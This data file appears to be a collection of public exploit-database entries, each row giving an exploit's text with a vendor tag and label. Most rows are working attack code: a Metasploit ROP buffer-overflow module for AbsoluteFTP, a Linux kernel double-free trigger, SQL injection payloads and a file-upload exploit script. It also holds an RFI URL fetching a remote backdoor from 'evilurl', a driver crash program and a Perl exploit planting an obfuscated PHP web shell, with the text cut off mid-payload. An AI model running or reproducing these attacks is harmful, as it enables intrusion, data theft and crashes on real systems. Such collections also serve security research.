18102,"AbsoluteFTP 1.9.6 < 2.2.10 - 'LIST' Remote Buffer Overflow (Metasploit) # Exploit Title: AbsoluteFTP 1.9.6 - 2.2.10 Remote Buffer Overflow (LIST) # Date: 2011-11-09 # Author: Node # Software Link: http://www.vandyke.com/pub/AbsoluteFTP/aftp2210.exe # Version: 1.9.6 - 2.2.10 # Tested on: Windows XP SP3, Windows 7 SP1 # CVE : -  # Exploit has been tested to work on:  # AbsoluteFTP 2.2.10 (build 252) # AbsoluteFTP 2.2.9 (build 248) # AbsoluteFTP 2.2.8 (build 241) # AbsoluteFTP 2.2.7 (build 238) # AbsoluteFTP 2.2.6 (build 230) # AbsoluteFTP 2.2.5 (build 225) # AbsoluteFTP 2.2.4 (build 216) # AbsoluteFTP 2.2.3 (build 210) # AbsoluteFTP 2.2.2 (build 203) # AbsoluteFTP 2.2 (build 197) # AbsoluteFTP 2.2 (build 291) # AbsoluteFTP 2.2B3 (build 163) # AbsoluteFTP 2.2B2 (build 158) # AbsoluteFTP 2.2B1 (build 144) # AbsoluteFTP 2.0.5 (build 297) # AbsoluteFTP 2.0.4 (build 293) # AbsoluteFTP 2.0.3 (build 289) # AbsoluteFTP 1.9.6  # Does not work on:  # AbsoluteFTP 1.8   ## # $Id: $ # Skeleton generated by mona.py - Corelan Team ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::FtpServer  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'AbsoluteFTP 1.9.6 - 2.2.10 Remote Buffer Overflow (LIST)', 			'Description'	=> %q{ 					This module exploits VanDyke Software AbsoluteFTP by overflowing 					a filename buffer related to the LIST command. 					 			}, 			'License'		=> MSF_LICENSE, 			'Author'		=> 				[ 					'Node',	# Original discovery, MSF module, ROP code 				], 			'Version'		=> '$Revision:$', 			'References'	=> 				[ 					[ 'OSVDB', '---' ], 					[ 'CVE', '---' ], 					[ 'URL', '---' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Platform'       => 'win', 			'Payload'        => 				{ 					'BadChars'        => ""\x00\x0d\x5c\x2f\x0a"",  				}, 			'Targets'		=> 				[ 					[ 'WinXP SP2 - Windows 7 SP1 / AbsoluteFTP 1.9.6 - 2.2.10.252', 						{ 							'Ret'   	=>	0x5f479005, 							'Offset'	=>	3336 						} 					], 				], 			'Privileged'	=> false, 			'DisclosureDate'	=> 'MONTH DAY YEAR', 			'DefaultTarget'	=> 0))  	end    	#copypasted from ScriptFTP exploit 	def on_client_unknown_command(c,cmd,arg) 		c.put(""200 OK\r\n"") 	end  	def on_client_command_list(c,arg)  		conn = establish_data_connection(c) 		if(not conn) 			c.put(""425 Can't build data connection\r\n"") 			return 		end  		print_status("" - Data connection set up"") 		code = 150 		c.put(""#{code} Here comes the directory listing.\r\n"")  		code = 226 		c.put(""#{code} Directory send ok.\r\n"")  	rop_gadgets =  		[		 			0x5f46a206,	# POP EAX # RETN (MFC42.DLL) 			0x5f49b260,	# <- *&VirtualProtect()  			0x5f413fa0,	# MOV EAX,DWORD PTR DS:[EAX] # RETN 04    ** [MFC42.DLL] 			0x5f418d93,	# PUSH EAX # ADD AL,5F # POP ESI # POP EBX # RETN    ** [MFC42.DLL] 			0x90909090,	# NOPS (RETN 4) 			0x90909090,	# NOPS (-> ebx) 			0x5f432001,	# POP EBP # RETN (MFC42.DLL) 			0x5F4774D5,	# ptr to 'jmp esp' (from MFC42.DLL) 			0x5f46a206,	# POP EAX # RETN (MFC42.DLL) 			0xfffffdff,	# value to negate, target value : 0x00000201, target reg : ebx #<--ADJUST ME FOR BIGGER PAYLOAD 			0x5f46f6dd,	# NEG EAX # RETN (MFC42.DLL) 			0x5f47909a,	# XCHG EAX,EBX # DEC EDX # POP EDI # RETN (MFC42.DLL) 			0x90909090,	# NOPS (-> edi) 			0x5f498456,	# POP ECX # RETN (MFC42.DLL) 			0x5F4D1115,	# RW pointer (lpOldProtect) (-> ecx) !!! 			0x5f46a206,	# POP EAX # RETN (MFC42.DLL) 			0xffffffc0,	# value to negate, target value : 0x00000040, target reg : edx 			0x5f46f6dd,	# NEG EAX # RETN (MFC42.DLL) 			0x5f4892df,	# XCHG EAX,EDX # DEC EAX # POP EDI # RETN (MFC42.DLL) 			0x5f479005,	# ROP NOP (-> edi) 			0x5f46a206,	# POP EAX # RETN (MFC42.DLL) 			0x90909090,	# NOPS (-> eax) 			0x5f4755b8,	# PUSHAD # RETN (MFC42.DLL) 		].pack(""V*"")   		buffer = [0x5f479005].pack(""V*"")*848 #ROP NOP's				 		buffer << rop_gadgets 		buffer << ""\x90""*30 		buffer << payload.encoded 		  		#copypasted from ScriptFTP exploit 		print_status("" - Sending directory list via data connection"") 		dirlist =  ""-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n"" 		dirlist << ""   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\n"" 		dirlist << ""rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n""  		conn.put(dirlist) 		conn.close 		return 	end  end",vandyke,1
41457,"Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC) // // EDB Note: More information ~ http://seclists.org/oss-sec/2017/q1/471 // // A trigger for CVE-2017-6074, crashes kernel. // Tested on 4.4.0-62-generic #83-Ubuntu kernel. // https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074 // // Andrey Konovalov <andreyknvl@gmail.com>  #define _GNU_SOURCE  #include <netinet/ip.h>  #include <sys/ioctl.h> #include <sys/mman.h> #include <sys/socket.h> #include <sys/stat.h> #include <sys/syscall.h> #include <sys/types.h>  #include <stdarg.h> #include <stdbool.h> #include <stddef.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>  #include <arpa/inet.h>  int main() { 	struct sockaddr_in6 sa1; 	sa1.sin6_family = AF_INET6; 	sa1.sin6_port = htons(20002); 	inet_pton(AF_INET6, ""::1"", &sa1.sin6_addr); 	sa1.sin6_flowinfo = 0; 	sa1.sin6_scope_id = 0; 		 	int optval = 8;  	int s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP); 	bind(s1, &sa1, 0x20); 	listen(s1, 0x9);  	setsockopt(s1, IPPROTO_IPV6, IPV6_RECVPKTINFO, &optval, 4);  	int s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP); 	connect(s2, &sa1, 0x20);  	shutdown(s1, SHUT_RDWR); 	close(s1); 	shutdown(s2, SHUT_RDWR); 	close(s2);  	return 0; }",linux,1
7597,"OwenPoll 1.0 - Insecure Cookie Handling [START]  #################################################################################################################### [0x01] Informations:  Script         : OwenPoll 1.0 Download       : http://www.hotscripts.com/jump.php?listing_id=75178&jump_type=1 Vulnerability  : Insecure Cookie Handling Author         : Osirys Contact        : osirys[at]live[dot]it Website        : http://osirys.org Notes          : Proud to be Italian Greets:        : x0r, emgent, Jay, str0ke, Todd and AlpHaNiX   #################################################################################################################### [0x02] Bug: [Insecure Cookie Handling] ######  Bugged file is: /[path]/checkloginmini.php  [CODE]      if (($loggedinname == $adminusername) AND ($loggedinpass == $adminpass)){         // authentication was successful         // create session and set cookie with username         session_start();         $_SESSION['auth'] = 1;               setcookie(""username"", $_POST['txtusername'], time()+(86400*30));  [/CODE]  If we log in correctly, a cookie is set with name ""username"" and as content the username name.  [!] FIX: Set as content username's password.  [CODE] setcookie(""username"", $_POST['txtpassword'], time()+(86400*30)); [/CODE]   [!] EXPLOIT: javascript:document.cookie = ""username=admin_username; path=/"";              *admin_username is the nick of the administrator  ####################################################################################################################  [/END]  # milw0rm.com [2008-12-28]",.hotscripts.,1
6866,"7Shop 1.1 - Arbitrary File Upload #!/usr/bin/perl  use warnings; use strict; use LWP::UserAgent; use HTTP::Request::Common;  my $fname = rand(1000) . "".php""; # int.. yes i know PU!  print <<INTRO; +++++++++++++++++++++++++++++++++++++++++++++++++++++ +     7Shop <= 1.1 Remote Arbitrary File Upload     + +             [Content-Type] -> Spoofing            + +         Discovered && Coded By: t0pP8uZz          + +                                                   + +        Contact IRC: irc.rizon.net #sectalk        + + Vendor not notified! Later versions maybe vuln!   + +                                                   + +   Discovered On: 25 October 2008 / milw0rm.com    + +                                                   + +          Script Download: http://7shop.de         + +++++++++++++++++++++++++++++++++++++++++++++++++++++ INTRO  print ""\nEnter URL(ie: http://site.com/shop): "";     chomp(my $url=<STDIN>);      print ""\nEnter File Path(path to local file to upload): "";     chomp(my $file=<STDIN>);  my $ua = LWP::UserAgent->new; my $re = $ua->request(POST $url.'/includes/imageupload.php',                       Content_Type => 'form-data',                       Content      => [ img1 => [ $file, $fname, Content_Type => 'image/jpeg' ], ] );  die ""HTTP POST Failed!"" unless $re->is_success;  if($re->content =~ /File is valid/) {          print ""File successfully uploaded! Access your file here: "" . $url . ""/images/artikel/"" . $fname . ""\n""; # say()? nah you havent got perl510 yet. have you! } elsif($re->content =~ /The requested URL/) { # apache debug only          print ""File Upload Failed! The requested target was not running a vulnerable version of 7shop!\n""; } else {          print ""File Upload Failed! target vulnerable, but upload failed.. try changing filename.\n""; } exit;  # milw0rm.com [2008-10-29]","7shop!\n"";",1
43355,"Zoom Linux Client 2.0.106600.0904 - Stack-Based Buffer Overflow (PoC) [CONVISO-17-002] - Zoom Linux Client Stack-based Buffer Overflow Vulnerability  1. Advisory Information     Conviso Advisory ID: CONVISO-17-002     CVE ID: CVE-2017-15048     CVSS v2: 6.8, (AV:N/AC:M/Au:N/C:P/I:P/A:P)     Date: 2017-10-01  2. Affected Components     Zoom client for Linux, version 2.0.106600.0904 (zoom_amd64.deb). Other versions may be     vulnerable.  3. Description     The binary /opt/zoom/ZoomLauncher is vulnerable to a buffer overflow because it concatenates a     overly long user input to a stack variable without checking if the destination buffer is long     enough to hold the data.     The binary also has important security features like canary turned off.     The client registers a scheme handler (zoommtg://) and this makes possible to trigger the     vulnerability remotely.  4. Details     gef>  checksec     [+] checksec for '/opt/zoom/ZoomLauncher'     Canary                        : No     NX                            : Yes     PIE                           : No     Fortify                       : No     RelRO                         : Partial     gef>      gef>  r $(python -c 'print ""A""*1048 + ""BBBBBBBB""')     Starting program: /opt/zoom/ZoomLauncher $(python -c 'print ""A""*1048 + ""BBBBBBBB""')     ZoomLauncher started.      Breakpoint 4, 0x00000000004025a6 in main ()     gef>  x/5i $pc     => 0x4025a6 <main+367>: call   0x4010f0 <strcat@plt>        0x4025ab <main+372>: lea    rax,[rbp-0x410]        0x4025b2 <main+379>: mov    rcx,0xffffffffffffffff        0x4025b9 <main+386>: mov    rdx,rax        0x4025bc <main+389>: mov    eax,0x0     gef>  x/s $rdi     0x7fffffffd330: """"     gef>  x/s $rsi     0x7fffffffdc35: 'A' <repeats 1048 times>, ""BBBBBBBB""     gef>  i f     Stack level 0, frame at 0x7fffffffd750:      rip = 0x4025a6 in main; saved rip = 0x7ffff7216f45      Arglist at 0x7fffffffd740, args:      Locals at 0x7fffffffd740, Previous frame's sp is 0x7fffffffd750      Saved registers:       rbp at 0x7fffffffd740, rip at 0x7fffffffd748     gef>  ni     0x00000000004025ab in main ()     gef>  i f     Stack level 0, frame at 0x7fffffffd750:      rip = 0x4025ab in main; saved rip = 0x4242424242424242      Arglist at 0x7fffffffd740, args:      Locals at 0x7fffffffd740, Previous frame's sp is 0x7fffffffd750      Saved registers:       rbp at 0x7fffffffd740, rip at 0x7fffffffd748     gef>  5. Solution     Upgrade to latest version.  6. Credits     Ricardo Silva <rsilva@conviso.com.br>     Gabriel Quadros <gquadros@conviso.com.br>  7. Report Timeline     Set 28, 2017 - Conviso sent first email asking for a channel to discuss the vulnerability.     Set 28, 2017 - Vendor asked the report in the current channel.     Set 28, 2017 - Conviso sent informations to reproduce the vulnerability.     Set 28, 2017 - Conviso asked if they could reproduce it.     Set 28, 2017 - Vendor replied saying that the informations were forwarded to engineering team.     Oct  5, 2017 - Vendor provided a patch candidate for testing.     Oct  5, 2017 - Conviso pointed problems in the patch.     Oct 11, 2017 - Vendor provided a patch candidate for testing.     Oct 12, 2017 - Conviso pointed problems in the patch.     Oct 23, 2017 - Conviso asked for status.     Oct 27, 2017 - Conviso asked for status.     Nov  1, 2017 - Conviso asked for status.     Nov  3, 2017 - Vendor replied.     Nov  6, 2017 - Conviso asked for status.     Nov  6, 2017 - Vendor replied.     Nov  9, 2017 - Conviso asked for status.     Nov 13, 2017 - Conviso asked for status.     Nov 15, 2017 - Conviso asked for status.     Nov 16, 2017 - Vendor provided a patch candidate for testing.     Nov 16, 2017 - The patch seems to fix the attack vector, although no further research was done.     Nov 20, 2017 - Vendor thanked and marked the issue as solved, considering the patch as a     sastifactory fix.     Nov 30, 2017 - Vendor released the version 2.0.115900.1201  8. References     https://zoom.us/download     https://support.zoom.us/hc/en-us/articles/205759689-New-Updates-for-Linux  9. About Conviso     Conviso is a consulting company specialized on application security. Our values are based on the     allocation of the adequate competencies on the field, a clear and direct speech with the market,     collaboration and partnership with our customers and business partners and constant investments     on methodology and research improvement. For more information about our company and services     provided, please check our website at www.conviso.com.br.  10. Copyright and Disclaimer     The information in this advisory is Copyright 2017 Conviso Application Security S/A and provided     so that the society can understand the risk they may be facing by running affected software,     hardware or other components used on their systems. In case you wish to copy information from     this advisory, you must either copy all of it or refer to this document (including our URL). No     guarantee is provided for the accuracy of this information, or damage you may cause your systems     in testing.",Zoom,1
8051,"Nokia N95-8 browser - 'setAttributeNode' Method Crash Application: Nokia N95-8 OS: Symbian ------------------------------------------------------ 1 - Description 2 - Vulnerability 3 - POC/EXPLOIT  ------------------------------------------------------ Description  The nokia n95 is a smartphone, this phone have more tools, for example: gps,mp3,camera,wireless.   :)   ------------------------------------------------------ Vulnerability  The vulnerability is caused when the browser, opened a web with javaScript code. This cause that page crash.  The error is in the method ""setAttributeNode"", because the bad implement is the cause of bug.  ------------------------------------------------------ POC/EXPLOIT  Enter in this url  http://es.geocities.com/jplopezy/nokiacrash2.html   or make html file and insert this code  <input type='checkbox' id='c'> <script> r=document.getElementById('c'); a=r.setAttributeNode(); </script>  ------------------------------------------------------ Juan Pablo Lopez Yacubian   # milw0rm.com [2009-02-13]",Nokia,1
43334,"Paid To Read Script 2.0.5 - 'uid' / 'fnum' / 'fn' SQL Injection # # # # #  # Exploit Title: Paid To Read Script 2.0.5 - SQL Injection # Dork: N/A # Date: 13.12.2017 # Vendor Homepage: https://www.phpscriptsmall.com/ # Software Link: https://www.phpscriptsmall.com/product/paid-to-read-script/ # Version: 2.0.5 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2017-17651 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/admin/userview.php?uid=[SQL] #  # -9++/*!08888UNION*/(/*!08888SELECT*/(1)%2c(2)%2c(3)%2c(4)%2c(5)%2c(6)%2c(7)%2c(8)%2c(9)%2c(10)%2c(11)%2c(12)%2c(13)%2c(14)%2c(15)%2c(16)%2c(17)%2c(18)%2c(19)%2c(20)%2c(21)%2c(22)%2c(23)%2c(24)%2c(25)%2c(26)%2c(27)%2c(28)%2c(29)%2c(30)%2c(31)%2c(32)%2c(33)%2c(34)%2c(35)%2c(36)%2c(37)%2c(38)%2c(39)%2c(40)%2c(41)%2c(42)%2c(43)%2c(44)%2c(45)%2c(46)%2c(47)%2c(48)%2c(/*!08888Select*/+export_set(5%2c@:=0%2c(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5%2cexport_set(5%2c@%2c/*!08888table_name*/%2c0x3c6c693e%2c2)%2c/*!08888column_name*/%2c0xa3a%2c2))%2c@%2c2))%2c(50)%2c(51)%2c(52)%2c(53)%2c(54)%2c(55)%2c(56)%2c(57)%2c(58)%2c(59)%2c(60)%2c(61)%2c(62)%2c(63)%2c(64)%2c(65)%2c(66)%2c(67)%2c(68))--+- #  # 	 # 2) # http://localhost/[PATH]/admin/viewemcamp.php?fnum=[SQL] #  # -1++/*!08888UNION*/(/*!08888SELECT*/+0x253238253331253239%2cCONCAT_WS(0x203a20%2cUSER()%2cDATABASE()%2cVERSION())%2c0x253238253333253239%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239)--+- #  #  # 3) # http://localhost/[PATH]/admin/viewvisitcamp.php?fn=[SQL] #  # -6++/*!50000UNION*/(/*!50000SELECT*/0x253238253331253239%2c0x253238253332253239%2c0x253238253333253239%2c0x253238253334253239%2cCONCAT_WS(0x203a20%2cUSER()%2cDATABASE()%2cVERSION())%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239%2c0x253238253331253333253239%2c0x253238253331253334253239)--+- #  # 	 # # # # #",paid_to_read_script_project,1
4735,"Oreon 1.4 / Centreon 1.4.1 - Multiple Remote File Inclusion Vulnerabilities By Michael Brooks Vulnerability Type: Multiple Remote File Inclusion. Software: Oreon and Centreon Homepage:http://www.oreon-project.org/  or http://www.centreon.com/ Versions: 1.4(Oreon) and 1.4.1(Centreon)  The vulnerable file is: ./oreon-1.4/www/include/monitoring/engine/MakeXML.php Another,virtually identical RFI: ./oreon-1.4/www/include/monitoring/engine/MakeXML4statusCounter.php  The attack: http://127.0.0.1/include/monitoring/engine/MakeXML.php?fileOreonConf=http://evilurl/backdoor.txt? or http://127.0.0.1/include/monitoring/engine/MakeXML4statusCounter.php?fileOreonConf=http://evilurl/backdoor.txt?  file MakeXML.php line 42 & 43: 	include_once($oreonPath . ""www/oreon.conf.php""); 	include_once($oreonPath . ""www/include/common/common-Func-ACL.php"");  Register_globals isn't needed for the taint: file MakeXML.php line 28: 	if (isset($_GET[""fileOreonConf""])) 		$oreonPath = $_GET[""fileOreonConf""];  However magic_quotes_gpc is require for LFI because you need a null byte.   Peace  # milw0rm.com [2007-12-14]",.oreon-project.,1
16021,"Look n stop - Local Denial of Service #include <stdio.h> #include <windows.h> #include <winioctl.h> #include <stdlib.h> #include <string.h>  /* Program          : Look 'n' Stop 2.06p4 / 2.07 (6.0.2900.5512) Homepage         : http://www.looknstop.com Discovery        : 2009/11/08 Author Contacted : 2010/07/15 ... no reply Found by         : Heurs This Advisory    : Heurs Contact          : s.leberre@sysdream.com   //----- Application description  Look 'n' Stop Firewall 2.07 provides key features to protect your computer against cyber threats. It prevents malicious programs from transmitting the data of your computer to hacker's computers. Look 'n' Stop Firewall 2.07 also protects your computer from external intrusions.  //----- Description of vulnerability  lnsfw1.sys driver generate a BSOD with particular value of IOCTL. Kernel wait an action with a kernel debugger.  //----- Credits  http://www.sysdream.com http://www.hackinparis.com/ http://ghostsinthestack.org  s.leberre at sysdream dot com heurs at ghostsinthestack dot org  */  int __cdecl main(int argc, char* argv[]) {     HANDLE hDevice = (HANDLE) 0xffffffff;     DWORD NombreByte;     DWORD Crashing[] = {         0x200ff822, 0xd24b37a1, 0x8ce055dc, 0x70b3d269,         0x3d2ef498, 0xcdd0e57c, 0xf2699fab, 0xed753dcb,         0xfdde2a99, 0x90590b61, 0x28011112, 0xeb35191c,         0x36f0e1e7, 0xef7ee764, 0x09b01e1f, 0x0bb86825,         0x1b886612, 0xd8c289df, 0xaa21ad45, 0x6fa7a76d,         0x13492a54, 0x7c2bc443, 0x65dbf582, 0xffeb86cc,         0xf48ca4fd, 0x75542bb5, 0xd05638ba, 0x3876e368,         0x678ba399, 0x6779f15c, 0x8f89ff55, 0xc8b9cf02,         0x033b9857, 0x82eef1a9, 0xf0dba3b6, 0xadf5b8f6,         0x033ef961, 0x393f043b, 0x515896fd, 0x28d10e25,         0x37b7f707, 0x1a425f92, 0x4bc6acfb, 0x45390605,         0x0be40107, 0xf121a706, 0x4b4c0e31, 0x88889f12,         0x0c60806d, 0x03af4569, 0xe5b68798, 0xb22bd966,         0xd532fe7f, 0x19a7213a, 0x6927f7f5, 0xcd4c3202,         0x96831f6b, 0x1d09991d, 0x48d1da67, 0x68f24415,         0xbb01a216, 0xdb6b634a, 0x18e36cb4, 0xcd7265c2,         0x64b81111, 0x4305d1b3, 0xc4f1ee8d, 0xfcd61343,         0xb8bfc8b9, 0x8a1a5541, 0xe9c3adcb, 0xca4c2a56,         0x89a67e7d, 0x74b8704e, 0xfe70e4d6, 0x27612082,         0xd8e211d7, 0x190ec39c, 0x380dfc09, 0x8d649b0c,         0xeda15e23, 0xe2e76319, 0xc781f249, 0x4cb25434,         0xeff3dc6a, 0xa0a6e976, 0x57014474, 0x98629b36,         0x2cc9fb9d, 0xa6a8b31b, 0xa3fbef44, 0xfeb130d3,         0x91e8c96b, 0xdc953762, 0x77341f7c, 0xd4ec9d26,         0x8504a663, 0x1da0406a, 0x8a049adf, 0x0f2ca8ef,         0xbc93ec1e, 0x027bdfad, 0x4c8885f6, 0x1c30be98,         0x0ec01493, 0x124d4252, 0x0765f8c1, 0x801652da,         0x778a6e6a, 0x09ef17aa, 0x6ece13fd, 0xa7280f9c,         0xcf6235f9, 0xabdeae81, 0x8145979e, 0x45af7871,         0xed3d36e0, 0x9e223b88, 0xfe26e7f2, 0xe13743f1,         0xa8171a6e, 0x611c303f, 0x252a68d2, 0xd013e026,         0x1259b868, 0xf673c420, 0x27a60840, 0xd87eed92,         0xef872203, 0x26868592, 0x18324bc9, 0xed47e068,         0xf2c0b162, 0x95966d8e, 0x07cc53db, 0xe8360489,         0x7c630b42, 0x8ab52dd9, 0xc5bf0c0e, 0xae8a8284,         0x97a0a5ab, 0x0cccb1c4, 0x4d768275, 0x1101e67e,         0x16e2f2c3, 0x82b7686a, 0x5b26314e, 0x52f74f38,         0xcb341107, 0xa59c70d0, 0x3327af19, 0xdd51188f,         0x54636221, 0xa05f288a, 0xeb7d4a3a, 0x2065885d,         0xb103190e, 0xd36e7e1e, 0xf7a7d560, 0xc62c828d,         0x9fc687e9, 0xcf609352, 00e96253         };     BYTE Out[0x20];          printf(""0day Local DoS - Look 'n' Stop 2.06p4\n\n"");     hDevice = CreateFile(""\\\\.\\LNSFW1"",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);     printf(""%x\n"",hDevice);          DeviceIoControl(hDevice,0x80000064,Crashing,0x28b,0,0,&NombreByte,NULL);          printf(""Sploit Send.\n\n"");     CloseHandle(hDevice);     getch();     return 0; }",.looknstop.,1
6018,"QNX Neutrino 0.8.4 Atomic Edition - Remote Code Execution #!/usr/bin/perl # # Neutrino 0.8.4 Atomic Edition Perl exploit # # discovered & written by Ams # ax330d@gmail.com # # DESCRIPTION: # First exploit destroys ""/data/sess.php"" file (simply strips tags), # then we are able to bypass authorization and using admin privelegies # our exploit uploads basic shell to ""/data/pages/shell_name"" and deletes ""/data/sess.php"". # Admin will not see that ""/data/sess.php"" is deleted (it will be restored back in new auth). # # USAGE: # Run exploit :perl expl.pl http://www.site.com # # NEEDED: # regardless php.ini settings... # # GREETZ :P # Goes to... SLV, to he ( he knows who =)) and  # others whom do i know =) #  use strict; use IO::Socket;  print ""\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 	\n\t\t Neutrino 0.8.4 Atomic Edition exploit 	\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n"";  if(@ARGV<1){ 	die ""\n\tUsage:\texpl.pl [host]\n\n 	\n\tExample:\texpl.pl http://localhost/blog/\n\n""; }  my $expl_url = $ARGV[0]; my $shell = q~ <?php $shell='YVhOelpYUW9KRjlRVDFOVVd5ZHdhSEJwYm1adkoxMHBQMlJwWlNod2FIQnBibVp2S0NrcE9qQTdDaVJsY2owbkp6c2t'. 'jMjA5Snp4a2FYWWdZMnhoYzNNOUltNW1ieUkrU1c1bWJ6cGJjMkZtWlY5dGIyUmxQU2N1YVc1cFgyZGxkQ2duYzJGbVpWOXRiMl'. 'JsSnlrdUoxMG1ibUp6Y0R0YloyeHZZbUZzY3owbkxtbHVhVjluWlhRb0ozSmxaMmx6ZEdWeVgyZHNiMkpoYkhNbktTNG5YU1p1W'. 'W5Od08xdHRZV2RwWTE5eGRXOTBaWE5mWjNCalBTY3VhVzVwWDJkbGRDZ25iV0ZuYVdOZmNYVnZkR1Z6WDJkd1l5Y3BMaWRkSm01a'. 'WMzQTdXMlJwYzJGaWJHVmtYMloxYm1OMGFXOXVjejBuTG1sdWFWOW5aWFFvSjJScGMyRmliR1ZrWDJaMWJtTjBhVzl1Y3ljcExpZ'. 'GRKbTVpYzNBN1BHSnlMejViY0dod09pY3VjR2h3ZG1WeWMybHZiaWdwTGlkZEptNWljM0E3VzNWelpYSTZKeTVuWlhSZlkzVnljb'. 'VZ1ZEY5MWMyVnlLQ2t1SjEwbWJtSnpjRHM4WW5JdlBsdDFibUZ0WlRvbkxuQm9jRjkxYm1GdFpTZ3BMaWRkSm01aWMzQTdQQzlrYV'. 'hZK1BHSnlMejRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjNObGRDZGRLU2w3YVdZb2FYTnpaWFFvSkY5R1NVeEZVMXNuWm1rblh'. 'Ta3BJR2xtS0NGQWJXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUmZSa2xNUlZOYkoyWnBKMTFiSjNSdGNGOXVZVzFsSjEwc0pGOUdTV'. 'XhGVTFzblpta25YVnNuYm1GdFpTZGRLU2tnSkhOdExqMG5QSE53WVc0Z1kyeGhjM005SW1WeWNtOXlJajVEYjNWc1pDQnViM1FnYlc'. '5MlpTQjFjR3h2WVdSbFpDQm1hV3hsSVR3dmMzQmhiajRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjJWMllXd25YU2twZTI5aVgzT'. 'jBZWEowS0NrN1pYWmhiQ2drWDFCUFUxUmJKMlYyWVd3blhTazdKSE50TGoxdllsOW5aWFJmWTJ4bFlXNG9LVHQ5Q21semMyVjBLQ1J'. 'mVUU5VFZGc25aWGhsWXlkZEtUOGtjMjB1UFNjOGNISmxQaWN1WUNSZlVFOVRWRnRsZUdWalhXQXVKend2Y0hKbFBpYzZNRHQ5Q21Wa'. 'mFHOGdKenhvZEcxc1BqeG9aV0ZrUGp4MGFYUnNaVDR1TGk1MFpXMXdiM0poY25rZ2MyaGxiR3d1TGk0OEwzUnBkR3hsUGp4dFpYUmhJ'. 'R2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0Vkhsd1pTSWdZMjl1ZEdWdWREMGlkR1Y0ZEM5b2RHMXNPeUJqYUdGeWMyVjBQWGRwYm1'. 'SdmQzTXRNVEkxTVNJdlBnbzhjM1I1YkdVZ2RIbHdaVDBpZEdWNGRDOWpjM01pUGdwaWIyUjVlMlp2Ym5RdFptRnRhV3g1T25abGNtUmh'. 'ibUVzWVhKcFlXd3NjMlZ5YVdZN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak16TXpPMk52Ykc5eU9pTm1PV1k1WmprN1ptOXVkQzF6YVh'. 'wbE9qRXdjSGc3ZlFvdVltOTRlMkp2Y21SbGNqb3hjSGdnYzI5c2FXUWdJMk5qWXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNek16TTd'. 'iV0Z5WjJsdU9tRjFkRzg3YldGeVoybHVMWFJ2Y0RvME1IQjRPM0JoWkdScGJtYzZNVEJ3ZUR0M2FXUjBhRG8wTURCd2VEdDlDaTV1Wm0'. '5N1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBak9UazVPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJelkyTmp0d1lXUmthVzVuT2pWd2VEdDl'. 'DaTVqZTJOdmJHOXlPaU0wTkRRN1ptOXVkQzF6YVhwbE9qQXVOMlZ0TzMwS2FXNXdkWFI3YldGeVoybHVPakp3ZUR0OUNqd3ZjM1I1YkdV'. 'K1BDOW9aV0ZrUGp4aWIyUjVQanhrYVhZZ1kyeGhjM005SW1KdmVDSStKeTRrYzIwdUp3bzhabTl5YlNCbGJtTjBlWEJsUFNKdGRXeDBhW'. 'EJoY25RdlptOXliUzFrWVhSaElpQmhZM1JwYjI0OUlpSWdiV1YwYUc5a1BTSndiM04wSWo0S1BIQStQR2x1Y0hWMElIUjVjR1U5SW5OMV'. 'ltMXBkQ0lnYm1GdFpUMGljR2h3YVc1bWJ5SWdkbUZzZFdVOUluQm9jR2x1Wm04aUx6NDhMM0ErQ25Wd2JHOWhaRG84YVc1d2RYUWdkSGx3'. 'WlQwaVptbHNaU0lnYm1GdFpUMGlabWtpTHo0OFluSXZQZ3BqYldRNkptNWljM0E3UEdsdWNIVjBJSFI1Y0dVOUluUmxlSFFpSUc1aGJXVT'. 'lJbVY0WldNaUlIWmhiSFZsUFNJaUx6NDhZbkl2UGdwbGRtRnNPaVp1WW5Od096eHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsUFNK'. 'bGRtRnNJaUIyWVd4MVpUMGlJaTgrUEdKeUx6NDhjRDRLUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2JtRnRaVDBpYzJWMElpQjJZV3'. 'gxWlQwaVQyc2lMejQ4TDNBK0Nqd3ZabTl5YlQ0OFluSXZQanh6Y0dGdUlHTnNZWE56UFNKaklqNTBiWEFnYzJobGJHd2dZbmtnUVcxelBD'. 